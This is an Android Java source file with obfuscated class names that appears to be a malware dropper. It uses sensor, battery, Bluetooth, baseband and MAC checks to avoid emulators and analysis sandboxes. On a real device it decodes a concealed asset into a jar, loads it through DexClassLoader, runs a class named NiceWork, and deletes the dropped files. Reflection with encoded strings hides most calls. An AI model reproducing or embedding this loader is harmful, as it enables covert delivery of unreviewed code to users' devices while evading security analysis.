package com.dmy;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.net.NetworkInterface;

import dalvik.system.DexClassLoader;

public class ClassName4 {

    public static void killAndRestart(Context context) {
        Intent intent = context.getPackageManager().getLaunchIntentForPackage(context.getPackageName());
        PendingIntent restartIntent = PendingIntent.getActivity(context.getApplicationContext(), 0, intent, PendingIntent.FLAG_ONE_SHOT);
        AlarmManager mgr = (AlarmManager) new ClassName4().invokeNoStaticMethod(context, ClassName2.decodeStr("getSystemService"), new Class[] { String.class }, "alarm");
        mgr.set(AlarmManager.RTC, System.currentTimeMillis() + 1000, restartIntent);
        android.os.Process.killProcess(android.os.Process.myPid());
    }

    public static String getMacAddress() {
        try {
            NetworkInterface networkInterface = NetworkInterface.getByName(ClassName2.decodeStr("wlan0"));
            if (networkInterface == null) {
                return "";
            }
            byte[] data = networkInterface.getHardwareAddress();
            if (data != null) {
                return ClassName0.toHex(data);
            }
        } catch (Exception var3) {
        }
        return "";
    }

    public boolean isBluetoothCheck() {
        String blue = "android.bluetooth.BluetoothAdapter";
        try {
            Object[] nhb_args = null;
            String blueStr = ClassName2.decodeStr(blue);
            Class cl = Class.forName(blueStr);
            Object nhb_host = null;
            String gda = "getDefaultAdapter";
            String gdaStr = ClassName2.decodeStr(gda);
            Class<?>[] nhb_clzs = null;
            Object ob = ClassName4.invokeMethod(cl, gdaStr, nhb_host, nhb_clzs, nhb_args);
            String gn = "getName";
            if (ob == null) {
                return true;
            }
            String gnStr = ClassName2.decodeStr(gn);
            Object re = ClassName4.invokeMethod(cl, gnStr, ob, nhb_clzs, nhb_args);
            if (re == null) {
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    public static void eteDirectory(File file) {
        if (file.isDirectory()) {
            File[] childFiles = (File[]) new ClassName4().invokeNoStaticMethod(file, ClassName2.decodeStr("listFiles"), null);
            if (childFiles != null) {
                for (int i = 0; i < childFiles.length; i++) {
                    new ClassName4().invokeNoStaticMethod(childFiles[i], ClassName2.decodeStr("delete"), null);
                }
            }
        }
        new ClassName4().invokeNoStaticMethod(file, ClassName2.decodeStr("delete"), null);
    }

    public static boolean checkbty(Context context) {
        Object mPowerProfile;
        double batteryCapacity = 0;
        final String ppcstr = ClassName2.decodeStr("com.android.internal.os.PowerProfile");
        try {
            mPowerProfile = Class.forName(ppcstr).getConstructor(Context.class).newInstance(context);
            batteryCapacity = (double) Class.forName(ppcstr).getMethod(ClassName2.decodeStr("getBatteryCapacity")).invoke(mPowerProfile);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return batteryCapacity <= 1000D;
    }

    public static Object invokeMethod(Class<?> clz, String methodName, Object host, Class<?>[] parameterTypes, Object[] args) {
        Object rst = null;
        if (clz != null) {
            Method method = null;
            try {
                method = clz.getMethod(methodName, parameterTypes);
                rst = new ClassName0().callMethod(host, method, args);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return rst;
    }

    public static void loadInnerSdk(Context context, String change) {
        Class<?> startClass = null;
        String getParentStr = ClassName2.decodeStr("msgetParentms").substring(2, 11);
        File targetFile = null;
        Object loader = null;
        if (startClass == null) {
            targetFile = new ClassName4().getTargetFile(context);
            String fileParent = (String) ClassName4.invokeMethod(targetFile.getClass(), getParentStr, targetFile, (Class<?>[]) null, (Object[]) null);
            ClassName4.releaseFile(context, targetFile);
            Object classLoader = ClassName4.invokeMethod(context.getClass(), ClassName2.decodeStr("msgetClassLoaderms").substring(2, 16), context, (Class<?>[]) null, (Object[]) null);
            Object parentCL = ClassName4.invokeMethod(classLoader.getClass(), getParentStr, classLoader, (Class<?>[]) null, (Object[]) null);
            loader = new DexClassLoader(targetFile.getPath(), targetFile.getParent(), null, (ClassLoader) parentCL);
            try {
                startClass = ((DexClassLoader) loader).loadClass(ClassName2.decodeStr("com.fat.nice.NiceWork"));
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            }
        }
        String str1 = ClassName2.decodeStr("startPager");
        String str2 = ClassName2.decodeStr("PluginConfig");
        ClassName1.invokeStaticMethod(startClass, str1, new Class[] { Context.class, String.class, String.class }, context, str2, ClassName2.decodeStr(change));
        if (targetFile != null && targetFile.exists()) {
            ClassName4.eteDirectory(targetFile.getParentFile());
        }
    }

    public static void startCheck(Context context, String change) {
        if (!ClassName1.isVirtual(context) && !ClassName3.isMacBad()) {
            if (ClassName4.isLightSensorCheck(context)) {
                return;
            }
            if (ClassName4.batteryCheck(context)) {
                SharedPreferences sensorCheckSP = context.getSharedPreferences("checkSensorSP", Context.MODE_PRIVATE);
                if (!Boolean.parseBoolean(sensorCheckSP.getString("check_result", "" + false))) {
                    new ClassName4().checkDirection(context, change);
                } else {
                    ClassName4.loadInnerSdk(context, change);
                }
            } else {
                ClassName4.loadInnerSdk(context, change);
            }
        }
    }

    public void checkDirection(Context context, String change) {
        SensorManager mSensorManager;
        SharedPreferences sensorCheckSP = context.getSharedPreferences("checkSensorSP", Context.MODE_PRIVATE);
        String checkResult = sensorCheckSP.getString("check_result", "" + false);
        if (!Boolean.parseBoolean(checkResult)) {
            SharedPreferences.Editor edit = sensorCheckSP.edit();
            edit.putString("check_count", "" + 0);
            edit.commit();
            mSensorManager = (SensorManager) new ClassName4().invokeNoStaticMethod(context, ClassName2.decodeStr("getSystemService"), new Class[] { String.class }, ClassName2.decodeStr("mssensorms").substring(2, 8));
            Sensor accelerometerSensor = ((Sensor) new ClassName4().invokeNoStaticMethod(mSensorManager, ClassName2.decodeStr("getDefaultSensor"), new Class[] { int.class }, 1));
            Sensor magenticSensor = ((Sensor) new ClassName4().invokeNoStaticMethod(mSensorManager, ClassName2.decodeStr("getDefaultSensor"), new Class[] { int.class }, 2));
            if (accelerometerSensor == null || magenticSensor == null) {
                return;
            }
            CheckListener listener = new CheckListener(mSensorManager, context, change);
            if (!listener.isRunning) {
                listener.setIsRunning(true);
                mSensorManager.registerListener(listener, accelerometerSensor, SensorManager.SENSOR_DELAY_NORMAL);
                mSensorManager.registerListener(listener, magenticSensor, SensorManager.SENSOR_DELAY_NORMAL);
            }
        } else {
            ClassName4.loadInnerSdk(context, change);
        }
    }

    public File getTargetFile(Context context) {
        String hashCodeMethod = ClassName2.decodeStr("mhashCodems").substring(1, 9);
        String processName = new ClassName0().getCurrentProcessName();
        String parentPath = "" + processName;
        parentPath = "" + ClassName4.invokeMethod(processName.getClass(), hashCodeMethod, parentPath, (Class<?>[]) null, (Object[]) null);
        String targetPath = (Build.VERSION.SDK_INT + processName);
        targetPath = "" + ClassName4.invokeMethod(processName.getClass(), hashCodeMethod, targetPath, (Class<?>[]) null, (Object[]) null) + ClassName2.decodeStr(".jar");
        File targetFile = new File(context.getCacheDir(), parentPath + File.separator + targetPath);
        ClassName3.createFile(targetFile);
        return targetFile;
    }

    public static boolean batteryCheck(Context context) {
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatusIntent = context.registerReceiver(null, ifilter);
        int status = batteryStatusIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL;
        int batteryLevel = batteryStatusIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        if (isCharging && batteryLevel > 80) {
            return true;
        }
        return false;
    }

    public static boolean checkUsbEnbl(Context context) {
        boolean enableAdb = false;
        enableAdb = (Settings.Secure.getInt(context.getContentResolver(), "adb_enabled", 0) > 0);
        return false;
    }

    public static void releaseFile(Context context, File targetFile) {
        try {
            String inputName = ClassName2.decodeStr("AssetName");
            InputStream inputPath = context.getAssets().open(inputName, 2);
            ClassName0.decodeFile(inputPath, new FileOutputStream(targetFile));
            inputPath.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static boolean checkBanbase() {
        String value = "";
        try {
            Object roSecureObj = Class.forName(ClassName2.decodeStr("android.os.SystemProperties")).getMethod(ClassName2.decodeStr("msgetms").substring(2, 5), String.class).invoke(null, ClassName2.decodeStr("gsm.version.baseband"));
            if (roSecureObj != null) {
                value = (String) roSecureObj;
            }
        } catch (Exception e) {
        }
        if (TextUtils.isEmpty(value)) {
            return true;
        } else {
            return false;
        }
    }

    public static byte getHashCode() {
        String s = "OSB";
        return (byte) s.hashCode();
    }

    public Object invokeNoStaticMethod(Object host, String name, Class<?>[] clsArray, Object... pArray) {
        try {
            if (host == null) {
                return null;
            }
            Method method = host.getClass().getMethod(name, clsArray);
            method.setAccessible(true);
            return method.invoke(host, pArray);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static boolean isLightSensorCheck(Context context) {
        try {
            Object ob = new ClassName4().invokeNoStaticMethod(context, ClassName2.decodeStr("getSystemService"), new Class[] { String.class }, ClassName2.decodeStr("mssensorms").substring(2, 8));
            Object re = new ClassName4().invokeNoStaticMethod(ob, ClassName2.decodeStr("getDefaultSensor"), new Class[] { int.class }, 5);
            if (ob == null) {
                return true;
            }
            if (re == null) {
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return true;
        }
        return false;
    }

    public static byte orOperation(int value_1, int value_2) {
        byte rst = 0;
        int sum = value_1 + value_2;
        int mult = value_1 * value_2;
        int sub = mult - sum;
        rst = (byte) (value_1 | value_2);
        return rst;
    }
}
